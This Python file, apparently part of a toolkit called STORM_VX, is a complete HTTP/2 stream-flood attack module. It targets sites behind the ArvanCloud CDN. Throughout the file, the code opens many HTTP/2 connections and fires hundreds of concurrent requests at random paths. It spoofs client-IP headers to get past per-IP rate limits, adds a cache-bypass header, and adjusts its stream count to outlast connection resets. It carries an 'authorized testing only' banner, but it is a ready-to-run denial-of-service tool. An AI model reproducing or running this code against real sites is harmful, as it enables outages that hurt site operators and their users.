#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VF H2 Push — HTTP/2 Multiplex Push Attack Module                      ║
║  Part of the STORM_VX Toolkit                                          ║
║                                                                          ║
║  Opens a single HTTP/2 connection and floods it with hundreds of        ║
║  concurrent streams, each requesting a different resource.              ║
║  ArvanCloud may have per-connection limits but weaker per-stream        ║
║  limits, allowing many requests to bypass rate limiting.                ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import string
from typing import Dict, Optional, List
from urllib.parse import urlparse

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False


# ─── Color Codes ──────────────────────────────────────────────────────────────

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ─── User-Agent Pool ─────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


class H2PushAttacker:
    """
    HTTP/2 Multiplex Push Attack.

    Opens a single HTTP/2 connection and sends hundreds of concurrent
    streams (requests) on that connection. ArvanCloud CDN may have
    per-connection limits but weaker per-stream limits, allowing
    many requests to be processed in parallel.

    When the connection resets (GOAWAY), we immediately open a new
    connection and continue. We auto-reduce streams_per_connection
    if we see frequent resets.

    Uses httpx with HTTP/2 support for proper H2 multiplexing.

    ArvanCloud blocking codes: 403, 429, 500, 503
    """

    # Path generation templates
    PATH_TEMPLATES = [
        "/?n={}",
        "/page/{}",
        "/api/data/{}",
        "/static/{}",
        "/assets/{}",
        "/img/{}",
        "/css/{}",
        "/js/{}",
        "/api/v1/resource/{}",
        "/api/v2/items/{}",
        "/search?q={}",
        "/category/{}",
        "/tag/{}",
        "/user/{}",
        "/post/{}",
        "/article/{}",
        "/product/{}",
        "/item/{}",
        "/file/{}",
        "/download/{}",
    ]

    def __init__(self, url: str, workers: int = 100, streams_per_connection: int = 200, timeout: int = 15):
        self.url = url
        self.workers = workers
        self.streams_per_connection = streams_per_connection
        self.timeout = timeout
        self.parsed = urlparse(url)
        self.host = self.parsed.hostname or ""
        self.base_url = f"{self.parsed.scheme}://{self.host}"

        # Current stream count (auto-adjusts)
        self._current_streams = streams_per_connection

        # Stats tracking
        self.stats = {
            "total_streams_opened": 0,
            "responses_received": 0,
            "responses_2xx": 0,
            "waf_blocked": 0,
            "connection_resets": 0,
            "connections_opened": 0,
            "errors": 0,
            "timeouts": 0,
            "rps": 0,
            "active_streams": 0,
        }
        self._lock = asyncio.Lock()
        self._start_time = 0.0
        self._recent_rps_times: List[float] = []

    async def _update_stats(self, key: str, delta: int = 1):
        async with self._lock:
            self.stats[key] = self.stats.get(key, 0) + delta

    async def _set_stats(self, key: str, value):
        async with self._lock:
            self.stats[key] = value

    async def _get_stats(self) -> Dict:
        async with self._lock:
            return dict(self.stats)

    def _generate_paths(self, count: int) -> List[str]:
        """Generate a list of unique paths to request."""
        paths = set()
        for _ in range(count):
            template = random.choice(self.PATH_TEMPLATES)
            identifier = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
            paths.add(template.format(identifier))
        return list(paths)[:count]

    def _get_bypass_headers(self) -> Dict[str, str]:
        """Generate headers with WAF bypass attempts."""
        headers = {
            "User-Agent": random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }

        # Random IP headers to bypass per-IP rate limiting
        if random.random() > 0.3:
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        if random.random() > 0.5:
            headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        if random.random() > 0.7:
            headers["X-Client-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

        # ArvanCloud-specific headers
        if random.random() > 0.8:
            headers["X-Arvan-Cache"] = "bypass"
        if random.random() > 0.9:
            headers["Cache-Control"] = "no-cache"

        return headers

    async def _h2_connection_worker(self, worker_id: int, stop_event: asyncio.Event):
        """Single worker that opens H2 connections and floods streams."""
        while not stop_event.is_set():
            try:
                if HAS_HTTPX:
                    await self._h2_flood_httpx(worker_id, stop_event)
                elif HAS_AIOHTTP:
                    await self._h2_flood_aiohttp(worker_id, stop_event)
                else:
                    print(f"  {C.R}[H2-PUSH] Neither httpx nor aiohttp available!{C.RS}")
                    return
            except Exception:
                await self._update_stats("errors")

            # Brief pause before reconnecting
            if not stop_event.is_set():
                await asyncio.sleep(random.uniform(0.01, 0.1))

    async def _h2_flood_httpx(self, worker_id: int, stop_event: asyncio.Event):
        """Flood using httpx with HTTP/2 support."""
        try:
            async with httpx.AsyncClient(
                http2=True,
                verify=False,
                timeout=httpx.Timeout(self.timeout, connect=self.timeout),
                limits=httpx.Limits(
                    max_connections=1,
                    max_keepalive_connections=1,
                ),
            ) as client:
                await self._update_stats("connections_opened")

                while not stop_event.is_set():
                    # Generate batch of paths
                    stream_count = self._current_streams
                    paths = self._generate_paths(stream_count)

                    # Send all requests concurrently on the same H2 connection
                    async def _send_request(path: str):
                        if stop_event.is_set():
                            return
                        try:
                            await self._update_stats("total_streams_opened")
                            await self._update_stats("active_streams")

                            url = f"{self.base_url}{path}"
                            headers = self._get_bypass_headers()

                            response = await client.get(url, headers=headers)
                            status = response.status_code

                            await self._update_stats("responses_received")

                            if status < 300:
                                await self._update_stats("responses_2xx")
                            elif status in (403, 429, 500, 503):
                                await self._update_stats("waf_blocked")
                            elif status == 431:
                                await self._update_stats("waf_blocked")

                            # Track RPS
                            self._recent_rps_times.append(time.time())

                        except httpx.ConnectError:
                            await self._update_stats("connection_resets")
                        except httpx.ReadTimeout:
                            await self._update_stats("timeouts")
                        except httpx.WriteTimeout:
                            await self._update_stats("timeouts")
                        except httpx.PoolTimeout:
                            await self._update_stats("timeouts")
                        except httpx.StreamError:
                            await self._update_stats("connection_resets")
                        except httpx.RemoteProtocolError:
                            await self._update_stats("connection_resets")
                        except Exception:
                            await self._update_stats("errors")
                        finally:
                            await self._update_stats("active_streams", -1)

                    # Launch all streams concurrently
                    tasks = [asyncio.create_task(_send_request(p)) for p in paths]
                    await asyncio.gather(*tasks, return_exceptions=True)

                    # Auto-adjust streams based on connection reset rate
                    stats = await self._get_stats()
                    resets = stats.get("connection_resets", 0)
                    if resets > 10:
                        self._current_streams = max(self._current_streams - 20, 10)

                    # Small delay between batches
                    await asyncio.sleep(0.01)

        except httpx.ConnectError:
            await self._update_stats("errors")
        except Exception:
            await self._update_stats("errors")

    async def _h2_flood_aiohttp(self, worker_id: int, stop_event: asyncio.Event):
        """Fallback: Flood using aiohttp (no H2 multiplexing, but still effective)."""
        try:
            timeout_obj = aiohttp.ClientTimeout(total=self.timeout)
            async with aiohttp.ClientSession(timeout=timeout_obj) as session:
                await self._update_stats("connections_opened")

                while not stop_event.is_set():
                    stream_count = self._current_streams
                    paths = self._generate_paths(stream_count)

                    async def _send_request(path: str):
                        if stop_event.is_set():
                            return
                        try:
                            await self._update_stats("total_streams_opened")
                            await self._update_stats("active_streams")

                            url = f"{self.base_url}{path}"
                            headers = self._get_bypass_headers()

                            async with session.get(url, headers=headers, ssl=False, allow_redirects=False) as resp:
                                status = resp.status
                                await self._update_stats("responses_received")

                                if status < 300:
                                    await self._update_stats("responses_2xx")
                                elif status in (403, 429, 500, 503):
                                    await self._update_stats("waf_blocked")

                            self._recent_rps_times.append(time.time())

                        except asyncio.TimeoutError:
                            await self._update_stats("timeouts")
                        except aiohttp.ClientError:
                            await self._update_stats("connection_resets")
                        except Exception:
                            await self._update_stats("errors")
                        finally:
                            await self._update_stats("active_streams", -1)

                    # Launch requests concurrently
                    tasks = [asyncio.create_task(_send_request(p)) for p in paths]
                    await asyncio.gather(*tasks, return_exceptions=True)

                    # Auto-adjust
                    stats = await self._get_stats()
                    resets = stats.get("connection_resets", 0)
                    if resets > 10:
                        self._current_streams = max(self._current_streams - 20, 10)

                    await asyncio.sleep(0.01)

        except Exception:
            await self._update_stats("errors")

    async def _print_stats(self, stop_event: asyncio.Event):
        """Print real-time statistics."""
        while not stop_event.is_set():
            elapsed = time.time() - self._start_time
            stats = await self._get_stats()

            # Calculate recent RPS (last 5 seconds)
            now = time.time()
            recent = [t for t in self._recent_rps_times if now - t < 5]
            # Keep list manageable
            self._recent_rps_times = [t for t in self._recent_rps_times if now - t < 30]
            current_rps = len(recent) / 5 if recent else 0

            streams = stats.get("total_streams_opened", 0)
            responses = stats.get("responses_received", 0)
            ok = stats.get("responses_2xx", 0)
            blocked = stats.get("waf_blocked", 0)
            resets = stats.get("connection_resets", 0)
            active = stats.get("active_streams", 0)
            conns = stats.get("connections_opened", 0)

            await self._set_stats("rps", round(current_rps, 1))

            print(
                f"{C.M}[H2-PUSH]{C.RS} "
                f"{C.BD}t={elapsed:.0f}s{C.RS} | "
                f"Streams: {C.CY}{streams:,}{C.RS} | "
                f"Active: {C.Y}{active}{C.RS} | "
                f"RPS: {C.G}{current_rps:.1f}{C.RS} | "
                f"OK: {C.G}{ok:,}{C.RS} | "
                f"Blocked: {C.R}{blocked}{C.RS} | "
                f"Resets: {C.Y}{resets}{C.RS} | "
                f"Per-Conn: {C.B}{self._current_streams}{C.RS}"
            )

            await asyncio.sleep(3)

    async def attack(self, stop_event: asyncio.Event, stats_callback=None) -> Dict:
        """
        Main attack entry point.

        Args:
            stop_event: Event to signal graceful shutdown.
            stats_callback: Optional callback for external stats reporting.

        Returns:
            Dict with attack statistics.
        """
        self._start_time = time.time()

        h2_lib = "httpx+H2" if HAS_HTTPX else "aiohttp" if HAS_AIOHTTP else "NONE"
        print(f"{C.BD}[H2-PUSH] Starting HTTP/2 Multiplex Push attack{C.RS}")
        print(f"  Target: {C.CY}{self.host}{C.RS}")
        print(f"  Workers: {C.W}{self.workers}{C.RS}")
        print(f"  Streams per connection: {C.W}{self.streams_per_connection}{C.RS}")
        print(f"  Timeout: {C.W}{self.timeout}s{C.RS}")
        print(f"  HTTP/2 library: {C.CY}{h2_lib}{C.RS}")
        print(f"  Strategy: Open H2 connections, flood with multiplexed streams{C.RS}")

        if not HAS_HTTPX and not HAS_AIOHTTP:
            print(f"  {C.R}ERROR: Neither httpx nor aiohttp available!{C.RS}")
            return {"error": "No HTTP library available"}

        # Launch worker tasks
        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self._h2_connection_worker(i, stop_event))
            tasks.append(task)

        # Stats printer
        stats_task = asyncio.create_task(self._print_stats(stop_event))

        # Wait for stop signal
        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            pass

        # Cleanup
        stats_task.cancel()
        for task in tasks:
            task.cancel()

        await asyncio.gather(stats_task, *tasks, return_exceptions=True)

        # Final stats
        elapsed = time.time() - self._start_time
        final_stats = await self._get_stats()
        final_stats["elapsed_seconds"] = round(elapsed, 2)
        final_stats["avg_rps"] = round(
            final_stats.get("total_streams_opened", 0) / max(elapsed, 1), 2
        )
        final_stats["final_streams_per_conn"] = self._current_streams
        final_stats["h2_library"] = h2_lib

        print(f"\n{C.BD}[H2-PUSH] Attack finished{C.RS}")
        print(f"  Total streams: {C.CY}{final_stats.get('total_streams_opened', 0):,}{C.RS}")
        print(f"  Responses: {C.G}{final_stats.get('responses_received', 0):,}{C.RS}")
        print(f"  2xx responses: {C.G}{final_stats.get('responses_2xx', 0):,}{C.RS}")
        print(f"  WAF blocked: {C.R}{final_stats.get('waf_blocked', 0)}{C.RS}")
        print(f"  Connection resets: {C.Y}{final_stats.get('connection_resets', 0)}{C.RS}")
        print(f"  Avg RPS: {C.CY}{final_stats.get('avg_rps', 0)}{C.RS}")
        print(f"  Final streams/conn: {C.B}{self._current_streams}{C.RS}")

        if stats_callback:
            await stats_callback(final_stats)

        return final_stats
